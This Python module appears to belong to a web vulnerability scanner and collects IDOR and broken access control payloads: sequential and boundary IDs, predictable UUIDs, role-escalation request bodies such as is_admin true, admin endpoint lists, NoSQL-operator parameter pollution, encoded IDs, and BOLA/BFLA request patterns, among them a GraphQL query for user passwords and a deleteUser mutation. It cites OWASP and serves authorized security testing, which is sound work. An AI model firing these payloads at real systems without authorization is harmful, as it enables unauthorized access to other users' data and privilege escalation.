"""
IDOR (Insecure Direct Object Reference) & Access Control Payloads
=================================================================
Generic payloads for detecting IDOR and Broken Access Control vulnerabilities.
These payloads are NOT application-specific.

Categories:
1. Sequential ID Manipulation (numeric increment/decrement)
2. UUID/GUID Manipulation (common patterns, null UUID)
3. Horizontal Privilege Escalation (same role, different user)
4. Vertical Privilege Escalation (lower to higher role)
5. Parameter Pollution (duplicate IDs, array injection)
6. Encoded ID Bypass (base64, hex, hash patterns)
7. API Object Level Authorization (BOLA)
8. Function Level Authorization (BFLA)

Reference: OWASP WSTG-ATHZ-04, OWASP API Security Top 10 (API1, API5)
"""

from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass
import base64
import hashlib
import re

# =============================================================================
# CATEGORY 1: SEQUENTIAL ID MANIPULATION
# =============================================================================

# Numeric ID variations to test
SEQUENTIAL_ID_PAYLOADS = [
    # Basic increments/decrements
    "1",
    "0",
    "-1",
    "2",
    "100",
    "999",
    "1000",
    "9999",
    "99999",
    
    # Common admin/system IDs
    "1",      # Often admin
    "0",      # Sometimes system/root
    "admin",  # String admin
    "root",   # String root
    
    # Boundary testing
    "2147483647",   # Max int32
    "2147483648",   # Max int32 + 1
    "-2147483648",  # Min int32
    "9223372036854775807",  # Max int64
    
    # Scientific notation (bypass filters)
    "1e0",
    "1e1",
    "1e2",
    
    # Float/decimal IDs
    "1.0",
    "1.1",
    "0.0",
    
    # Padded zeros
    "01",
    "001",
    "0001",
    "00001",
]

# ID parameter names commonly vulnerable
IDOR_PARAMETER_NAMES = [
    # User-related
    "id",
    "user_id",
    "userId",
    "user",
    "uid",
    "account_id",
    "accountId",
    "account",
    "profile_id",
    "profileId",
    "member_id",
    "memberId",
    
    # Document/Resource-related
    "doc_id",
    "docId",
    "document_id",
    "documentId",
    "file_id",
    "fileId",
    "report_id",
    "reportId",
    "invoice_id",
    "invoiceId",
    
    # Order/Transaction-related
    "order_id",
    "orderId",
    "order",
    "transaction_id",
    "transactionId",
    "payment_id",
    "paymentId",
    "cart_id",
    "cartId",
    "basket_id",
    "basketId",
    
    # Message/Communication
    "message_id",
    "messageId",
    "chat_id",
    "chatId",
    "thread_id",
    "threadId",
    "comment_id",
    "commentId",
    
    # Generic
    "item_id",
    "itemId",
    "resource_id",
    "resourceId",
    "object_id",
    "objectId",
    "record_id",
    "recordId",
    "ref",
    "reference",
    "no",
    "num",
    "number",
]

# =============================================================================
# CATEGORY 2: UUID/GUID MANIPULATION
# =============================================================================

UUID_MANIPULATION_PAYLOADS = [
    # Null/Empty UUIDs
    "00000000-0000-0000-0000-000000000000",
    "00000000-0000-0000-0000-000000000001",
    "00000000-0000-0000-0000-000000000002",
    
    # All-ones UUID
    "ffffffff-ffff-ffff-ffff-ffffffffffff",
    "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF",
    
    # Sequential UUIDs (version 1 - time-based, predictable)
    "00000000-0000-1000-8000-000000000001",
    "00000000-0000-1000-8000-000000000002",
    
    # Test/development UUIDs often left in production
    "11111111-1111-1111-1111-111111111111",
    "12345678-1234-1234-1234-123456789012",
    "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
    "deadbeef-dead-beef-dead-beefdeadbeef",
    "cafebabe-cafe-babe-cafe-babecafebabe",
    
    # Admin/system UUIDs patterns
    "admin000-0000-0000-0000-000000000000",
    "root0000-0000-0000-0000-000000000000",
    "system00-0000-0000-0000-000000000000",
    
    # Common test UUIDs
    "test0000-0000-0000-0000-000000000000",
    "demo0000-0000-0000-0000-000000000000",
    
    # Without hyphens
    "00000000000000000000000000000000",
    "00000000000000000000000000000001",
    "ffffffffffffffffffffffffffffffff",
]

# =============================================================================
# CATEGORY 3: HORIZONTAL PRIVILEGE ESCALATION
# =============================================================================

# Test accessing other users' resources with same privilege level
HORIZONTAL_ESCALATION_PATTERNS = [
    # Replace current user ID with target
    {"pattern": "{current_id}", "replace_with": "{target_id}"},
    {"pattern": "{current_id}", "replace_with": "1"},
    {"pattern": "{current_id}", "replace_with": "2"},
    {"pattern": "{current_id}", "replace_with": "admin"},
    
    # Common usernames to test
    {"username": "admin"},
    {"username": "administrator"},
    {"username": "root"},
    {"username": "test"},
    {"username": "user"},
    {"username": "demo"},
    {"username": "guest"},
]

# Endpoints commonly vulnerable to horizontal escalation
HORIZONTAL_VULN_ENDPOINTS = [
    "/api/users/{id}",
    "/api/user/{id}",
    "/api/profile/{id}",
    "/api/account/{id}",
    "/api/orders/{id}",
    "/api/messages/{id}",
    "/api/documents/{id}",
    "/api/files/{id}",
    "/users/{id}",
    "/user/{id}/profile",
    "/account/{id}/settings",
    "/basket/{id}",
    "/cart/{id}",
    "/order/{id}",
    "/invoice/{id}",
]

# =============================================================================
# CATEGORY 4: VERTICAL PRIVILEGE ESCALATION
# =============================================================================

# Role manipulation payloads
ROLE_ESCALATION_PAYLOADS = [
    # Common admin roles
    {"role": "admin"},
    {"role": "administrator"},
    {"role": "root"},
    {"role": "superuser"},
    {"role": "super_admin"},
    {"role": "superadmin"},
    {"role": "sysadmin"},
    {"role": "system"},
    
    # Role IDs
    {"role_id": 1},
    {"role_id": 0},
    {"roleId": 1},
    {"roleId": 0},
    
    # Permission levels
    {"level": 0},
    {"level": 1},
    {"level": 999},
    {"permission_level": 0},
    {"access_level": "admin"},
    
    # Boolean flags
    {"is_admin": True},
    {"isAdmin": True},
    {"admin": True},
    {"is_superuser": True},
    {"isSuperuser": True},
    
    # Group/role arrays
    {"roles": ["admin"]},
    {"roles": ["admin", "user"]},
    {"groups": ["administrators"]},
    {"permissions": ["*"]},
    {"permissions": ["admin", "read", "write", "delete"]},
]

# Admin endpoints to test access
ADMIN_ENDPOINTS = [
    "/admin",
    "/admin/",
    "/admin/dashboard",
    "/admin/users",
    "/admin/settings",
    "/administrator",
    "/management",
    "/manager",
    "/console",
    "/panel",
    "/control",
    "/api/admin",
    "/api/admin/users",
    "/api/admin/settings",
    "/api/management",
    "/api/internal",
    "/internal",
    "/private",
    "/restricted",
    "/debug",
    "/system",
    "/config",
    "/configuration",
]

# =============================================================================
# CATEGORY 5: PARAMETER POLLUTION FOR IDOR
# =============================================================================

PARAMETER_POLLUTION_PAYLOADS = [
    # Duplicate parameters
    "id=1&id=2",
    "user_id=1&user_id=admin",
    "id[]=1&id[]=2",
    
    # Array injection
    "id[0]=1",
    "id[1]=2",
    "user_id[]=admin",
    
    # JSON in parameter
    'id={"$gt":""}',
    'id={"$ne":null}',
    
    # Nested object
    "user[id]=1",
    "user[role]=admin",
    "data[user_id]=1",
]

# =============================================================================
# CATEGORY 6: ENCODED ID BYPASS
# =============================================================================

def generate_encoded_ids(original_id: str) -> List[Dict[str, str]]:
    """Generate various encoded versions of an ID."""
    encoded = []
    
    # Base64 encoding
    b64 = base64.b64encode(original_id.encode()).decode()
    encoded.append({"type": "base64", "value": b64})
    
    # URL-safe Base64
    b64_url = base64.urlsafe_b64encode(original_id.encode()).decode()
    encoded.append({"type": "base64_urlsafe", "value": b64_url})
    
    # Hex encoding
    hex_val = original_id.encode().hex()
    encoded.append({"type": "hex", "value": hex_val})
    
    # MD5 hash (if numeric, some apps use hash of ID)
    md5_hash = hashlib.md5(original_id.encode()).hexdigest()
    encoded.append({"type": "md5", "value": md5_hash})
    
    # SHA1 hash
    sha1_hash = hashlib.sha1(original_id.encode()).hexdigest()
    encoded.append({"type": "sha1", "value": sha1_hash})
    
    # URL encoding
    url_encoded = original_id.replace(" ", "%20")
    encoded.append({"type": "url", "value": url_encoded})
    
    # Double URL encoding
    double_url = original_id.replace(" ", "%2520")
    encoded.append({"type": "double_url", "value": double_url})
    
    return encoded


# Pre-generated encoded payloads for common IDs
ENCODED_ID_PAYLOADS = [
    # Base64 encoded IDs
    "MQ==",          # "1"
    "Mg==",          # "2"
    "YWRtaW4=",      # "admin"
    "cm9vdA==",      # "root"
    "MA==",          # "0"
    
    # Hex encoded
    "31",            # "1"
    "32",            # "2"
    "61646d696e",    # "admin"
    "726f6f74",      # "root"
    
    # Common hash patterns (MD5 of small numbers)
    "c4ca4238a0b923820dcc509a6f75849b",  # MD5("1")
    "c81e728d9d4c2f636f067f89cc14862c",  # MD5("2")
    "cfcd208495d565ef66e7dff9f98764da",  # MD5("0")
    "21232f297a57a5a743894a0e4a801fc3",  # MD5("admin")
]

# =============================================================================
# CATEGORY 7: BOLA (Broken Object Level Authorization) - API Specific
# =============================================================================

BOLA_TEST_PATTERNS = [
    # REST API patterns
    {"method": "GET", "path": "/api/v1/users/{id}"},
    {"method": "GET", "path": "/api/v1/users/{id}/profile"},
    {"method": "PUT", "path": "/api/v1/users/{id}"},
    {"method": "DELETE", "path": "/api/v1/users/{id}"},
    {"method": "PATCH", "path": "/api/v1/users/{id}"},
    
    # Resource access
    {"method": "GET", "path": "/api/v1/orders/{id}"},
    {"method": "GET", "path": "/api/v1/documents/{id}"},
    {"method": "GET", "path": "/api/v1/files/{id}/download"},
    {"method": "GET", "path": "/api/v1/invoices/{id}/pdf"},
    
    # GraphQL patterns
    {"method": "POST", "path": "/graphql", "query": "query { user(id: {id}) { email, password } }"},
    {"method": "POST", "path": "/graphql", "query": "mutation { deleteUser(id: {id}) }"},
]

# =============================================================================
# CATEGORY 8: BFLA (Broken Function Level Authorization)
# =============================================================================

BFLA_TEST_PATTERNS = [
    # Admin functions accessible to regular users
    {"method": "POST", "path": "/api/admin/users", "body": {"username": "test"}},
    {"method": "DELETE", "path": "/api/admin/users/{id}"},
    {"method": "PUT", "path": "/api/admin/settings"},
    {"method": "GET", "path": "/api/admin/logs"},
    {"method": "GET", "path": "/api/admin/audit"},
    
    # Privilege elevation
    {"method": "PUT", "path": "/api/users/{id}/role", "body": {"role": "admin"}},
    {"method": "PATCH", "path": "/api/users/{id}", "body": {"is_admin": True}},
    
    # Hidden/internal endpoints
    {"method": "GET", "path": "/api/internal/users"},
    {"method": "GET", "path": "/api/debug/config"},
    {"method": "POST", "path": "/api/system/execute"},
]

# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def get_id_variations(original_id: str, count: int = 10) -> List[str]:
    """
    Generate ID variations around the original ID for IDOR testing.
    
    Args:
        original_id: The original ID to generate variations from
        count: Number of variations to generate
        
    Returns:
        List of ID variations
    """
    variations = [original_id]
    
    try:
        # If numeric, generate sequential IDs
        num_id = int(original_id)
        for i in range(1, count + 1):
            variations.append(str(num_id - i))
            variations.append(str(num_id + i))
        variations.append("0")
        variations.append("1")
        variations.append("-1")
    except ValueError:
        # If not numeric (UUID, string), use other variations
        variations.extend([
            "1", "2", "0", "-1",
            "admin", "root", "test",
            "00000000-0000-0000-0000-000000000000",
            "00000000-0000-0000-0000-000000000001",
        ])
    
    return list(set(variations))


def detect_id_in_url(url: str) -> List[Dict[str, Any]]:
    """
    Detect potential ID parameters in a URL.
    
    Args:
        url: URL to analyze
        
    Returns:
        List of detected IDs with their positions
    """
    detected = []
    
    # Pattern for numeric IDs in path
    numeric_pattern = r'/(\d+)(?:/|$|\?)'
    for match in re.finditer(numeric_pattern, url):
        detected.append({
            "type": "numeric",
            "value": match.group(1),
            "position": match.start(1),
            "in_path": True
        })
    
    # Pattern for UUIDs in path
    uuid_pattern = r'/([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})(?:/|$|\?)'
    for match in re.finditer(uuid_pattern, url):
        detected.append({
            "type": "uuid",
            "value": match.group(1),
            "position": match.start(1),
            "in_path": True
        })
    
    # Pattern for query parameters
    param_pattern = r'[?&](' + '|'.join(IDOR_PARAMETER_NAMES[:20]) + r')=([^&]+)'
    for match in re.finditer(param_pattern, url, re.IGNORECASE):
        detected.append({
            "type": "parameter",
            "name": match.group(1),
            "value": match.group(2),
            "position": match.start(),
            "in_path": False
        })
    
    return detected


def generate_idor_test_urls(base_url: str, detected_ids: List[Dict]) -> List[str]:
    """
    Generate test URLs by replacing detected IDs with test values.
    
    Args:
        base_url: Original URL
        detected_ids: List of detected ID information
        
    Returns:
        List of test URLs
    """
    test_urls = []
    
    for id_info in detected_ids:
        original_value = id_info["value"]
        variations = get_id_variations(original_value)
        
        for var in variations:
            if id_info["in_path"]:
                # Replace in path
                test_url = base_url.replace(f"/{original_value}", f"/{var}")
            else:
                # Replace in query parameter
                test_url = base_url.replace(
                    f"{id_info['name']}={original_value}",
                    f"{id_info['name']}={var}"
                )
            test_urls.append(test_url)
    
    return list(set(test_urls))


def get_all_idor_payloads() -> List[str]:
    """Get all IDOR payloads as a flat list."""
    payloads = []
    payloads.extend(SEQUENTIAL_ID_PAYLOADS)
    payloads.extend(UUID_MANIPULATION_PAYLOADS)
    payloads.extend(ENCODED_ID_PAYLOADS)
    return payloads


def get_idor_payloads_by_category() -> Dict[str, List]:
    """Get IDOR payloads organized by category."""
    return {
        "sequential_ids": SEQUENTIAL_ID_PAYLOADS,
        "uuid_manipulation": UUID_MANIPULATION_PAYLOADS,
        "encoded_ids": ENCODED_ID_PAYLOADS,
        "role_escalation": [str(p) for p in ROLE_ESCALATION_PAYLOADS],
        "admin_endpoints": ADMIN_ENDPOINTS,
        "parameter_names": IDOR_PARAMETER_NAMES,
    }


def get_idor_detection_patterns() -> List[str]:
    """Regex patterns to detect IDOR vulnerabilities."""
    return [
        # Access to other user's data
        r"user.*id.*different",
        r"unauthorized.*access",
        r"access.*denied",
        r"permission.*denied",
        r"forbidden",
        r"not.*authorized",
        
        # Successful unauthorized access indicators
        r"email.*@",
        r"password",
        r"secret",
        r"private",
        r"confidential",
        
        # Admin access indicators
        r"admin.*dashboard",
        r"administrator",
        r"management.*console",
        
        # Data exposure
        r"user.*data",
        r"account.*information",
        r"personal.*info",
    ]


# =============================================================================
# PAYLOAD METADATA
# =============================================================================

IDOR_PAYLOAD_INFO = {
    "sequential_ids": len(SEQUENTIAL_ID_PAYLOADS),
    "uuid_manipulation": len(UUID_MANIPULATION_PAYLOADS),
    "encoded_ids": len(ENCODED_ID_PAYLOADS),
    "role_escalation": len(ROLE_ESCALATION_PAYLOADS),
    "admin_endpoints": len(ADMIN_ENDPOINTS),
    "parameter_names": len(IDOR_PARAMETER_NAMES),
    "horizontal_endpoints": len(HORIZONTAL_VULN_ENDPOINTS),
    "bola_patterns": len(BOLA_TEST_PATTERNS),
    "bfla_patterns": len(BFLA_TEST_PATTERNS),
    "total_payloads": len(get_all_idor_payloads()),
    "reference": "OWASP WSTG-ATHZ-04, API Security Top 10",
    "description": "IDOR and Broken Access Control testing payloads",
}


if __name__ == "__main__":
    print("=" * 60)
    print("IDOR/ACCESS CONTROL PAYLOAD STATISTICS")
    print("=" * 60)
    
    info = IDOR_PAYLOAD_INFO
    print(f"\nSequential IDs: {info['sequential_ids']}")
    print(f"UUID Manipulation: {info['uuid_manipulation']}")
    print(f"Encoded IDs: {info['encoded_ids']}")
    print(f"Role Escalation: {info['role_escalation']}")
    print(f"Admin Endpoints: {info['admin_endpoints']}")
    print(f"Parameter Names: {info['parameter_names']}")
    print(f"Horizontal Endpoints: {info['horizontal_endpoints']}")
    print(f"BOLA Patterns: {info['bola_patterns']}")
    print(f"BFLA Patterns: {info['bfla_patterns']}")
    print(f"\nTotal Unique Payloads: {info['total_payloads']}")
    
    print("\n=== Sample URL ID Detection ===")
    test_url = "/api/users/123/orders/456?account_id=789"
    detected = detect_id_in_url(test_url)
    print(f"URL: {test_url}")
    print(f"Detected IDs: {detected}")
